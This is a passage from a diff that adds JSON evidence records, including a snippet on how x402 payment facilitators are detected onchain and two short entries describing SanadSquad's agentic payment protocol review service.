`facilitator_name`. New facilitators are added as they appear onchain.\n\n## [​](#how-detection-works) How detection works\n\nDetection is protocol-specific:\n\n* **x402** is identified via known facilitator addresses and transfer patterns. On EVM, `s",
+        "status": "ok"
+      },
+      {
+        "source_id": "STAT-04",
+        "kind": "stat",
+        "url": null,
+        "title": "SanadSquad",
+        "retrieved_at": "2026-10-24T13:40:47.589490Z",
+        "published_at": null,
+        "evidence_text": "SanadSquad provides agentic payment protocol review for x402 and MPP, including integration review, facilitator trust, and payment policy design.",
+        "status": "ok"
+      },
+      {
+        "source_id": "STAT-05",
+        "kind": "stat",
+        "url": null,
+        "title": "SanadSquad",
+        "retrieved_at": "2026-10-24T13:40:47.589513Z",
+        "published_at": null,
+        "evidence_text": "Teams can request a review.",
+        "status": "ok"
+      }
+    ],
+    "kb_allowed": false
+  }
+}
